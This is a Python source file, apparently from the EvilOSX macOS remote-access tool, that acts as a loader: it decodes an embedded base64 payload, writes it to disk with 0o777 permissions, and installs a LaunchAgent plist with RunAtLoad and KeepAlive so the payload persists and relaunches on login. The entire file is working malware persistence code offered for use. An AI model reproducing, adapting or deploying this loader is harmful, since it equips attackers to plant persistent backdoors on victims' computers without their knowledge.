# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import base64
import logging
import os
import subprocess
from sys import exit
from textwrap import dedent

# ============================================================
# These variables will be patched when this loader is created.
LOADER_OPTIONS = {}
PAYLOAD_BASE64 = ""
# ============================================================

PROGRAM_DIRECTORY = os.path.expanduser(LOADER_OPTIONS["program_directory"])
LAUNCH_AGENT_NAME = LOADER_OPTIONS["launch_agent_name"]
PAYLOAD_FILENAME = LOADER_OPTIONS["payload_filename"]

# Logging
logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
log = logging.getLogger("launch_daemon")

log.debug("Program directory: " + PROGRAM_DIRECTORY)
log.debug("Launch agent name: " + LAUNCH_AGENT_NAME)
log.debug("Payload filename: " + PAYLOAD_FILENAME)


def get_program_file():
    """:return: The path to the encrypted payload."""
    return os.path.join(PROGRAM_DIRECTORY, PAYLOAD_FILENAME)


def get_launch_agent_directory():
    """:return: The directory where the launch agent lives."""
    return os.path.expanduser("~/Library/LaunchAgents")


def get_launch_agent_file():
    """:return: The path to the launch agent."""
    return get_launch_agent_directory() + "/%s.plist" % LAUNCH_AGENT_NAME


def run_command(command):
    """Runs a system command and returns its response."""
    out, err = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
    return out + err


# Create directories
run_command("mkdir -p " + PROGRAM_DIRECTORY)
run_command("mkdir -p " + get_launch_agent_directory())

# Create launch agent
launch_agent_create = dedent("""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>KeepAlive</key>
    <true/>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""") % (LAUNCH_AGENT_NAME, get_program_file())

with open(get_launch_agent_file(), "w") as output_file:
    output_file.write(launch_agent_create)

with open(get_program_file(), "w") as output_file:
    output_file.write(base64.b64decode(PAYLOAD_BASE64))

os.chmod(get_program_file(), 0o777)

# Load the launch agent
output = run_command("launchctl load -w " + get_launch_agent_file())

if output == "":
    if run_command("launchctl list | grep -w %s" % LAUNCH_AGENT_NAME):
        log.info("Done!")
        exit(0)
    else:
        log.error("Failed to load launch agent.")
        pass
elif "already loaded" in output.lower():
    log.error("EvilOSX is already loaded.")
    exit(0)
else:
    log.error("Unexpected output: " + output)
    pass
